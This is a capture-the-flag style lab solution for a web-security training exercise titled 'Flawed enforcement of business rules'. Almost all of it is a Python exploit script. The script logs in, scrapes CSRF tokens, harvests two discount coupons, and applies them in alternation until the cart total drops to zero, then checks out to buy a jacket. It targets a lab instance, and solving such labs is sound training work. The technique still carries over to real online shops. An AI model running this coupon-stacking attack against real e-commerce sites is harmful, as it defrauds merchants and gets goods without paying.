# Flawed enforcement of business rules

> This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
> You can log in to your own account using the following credentials: `wiener:peter`


```python
import requests
from bs4 import BeautifulSoup
import re

BASE_URL = "https://0a840001039e305f802d353700510015.web-security-academy.net/"

def exploit(url):
    session = requests.Session()
    
    # 1. Authentication Phase
    login_endpoint = f"{url}login"
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    login_credentials = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    
    response = session.post(login_endpoint, data=login_credentials)
    if "Log out" not in response.text:
        print("[-] Login failed.")
        return
        
    print("[+] LOGIN SUCCESSFUL")
    
    # 2. Add Target Item to Cart
    cart_endpoint = f"{url}cart"
    cart_payload = {
        "productId": 1,
        "redir": "PRODUCT",
        "quantity": 1
    }
    
    session.post(cart_endpoint, data=cart_payload)
    print("[+] JACKET ADDED TO CART")
    
    # 3. Harvest Coupon 1 (From Alert Banner)
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    coupon_1 = soup.find('div', role='alert').text.split(':')[1].strip()
    print(f"[+] FETCHED COUPON 1: {coupon_1}")
    
    # 4. Harvest Coupon 2 (Newsletter Signup)
    signup_endpoint = f"{url}sign-up"
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    signup_csrf = soup.find("input", {"name": "csrf"})['value']
    
    signup_payload = {
        "csrf": signup_csrf,
        "email": "attacker@tactical.com"
    }
    session.post(signup_endpoint, data=signup_payload)
    print("[+] NEWSLETTER SIGNUP COMPLETE")
    
    confirm_params = {"sign-up-confirmed": "true"}
    response = session.get(url, params=confirm_params)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Extracting coupon from script text via DOM parsing
    coupon_2 = re.search(r"(SIGNUP\d+)", response.text)
    if coupon_2:
        coupon_2 = coupon_2.group(1)
    else:
        coupon_2 = soup.find_all('script')[1].text.split('n')[1].split('a')[0].strip()
    print(f"[+] FETCHED COUPON 2: {coupon_2}")
    
    # 5. Business Logic Bypass (Alternating Coupons)
    coupon_endpoint = f"{url}cart/coupon"
    print("[*] Applying alternating coupons to drain cart balance...")
    
    # Pythonic toggle using modulo to alternate between coupons
    for i in range(8):
        active_coupon = coupon_1 if i % 2 == 0 else coupon_2
        
        response = session.get(cart_endpoint)
        soup = BeautifulSoup(response.text, 'html.parser')
        cart_csrf = soup.find("input", {"name": "csrf"})['value']
        
        coupon_payload = {
            "csrf": cart_csrf,
            "coupon": active_coupon
        }
        session.post(coupon_endpoint, data=coupon_payload)
        print(f"[*] APPLIED COUPON: {active_coupon}")
            
    # 6. Checkout Phase
    response = session.get(cart_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    checkout_csrf = soup.find("input", {"name": "csrf"})['value']
    
    checkout_endpoint = f"{url}cart/checkout"    
    checkout_payload = {"csrf": checkout_csrf}
    session.post(checkout_endpoint, data=checkout_payload)   
    
    # 7. Verification Phase
    final_response = session.get(url)
    if "Congratulations" in final_response.text:
        print("[+] TARGET SECURED: SUCCESSFULLY PURCHASED THE JACKET")  
    else:
        print("[-] Checkout failed.")

if __name__ == "__main__":
    exploit(BASE_URL)
```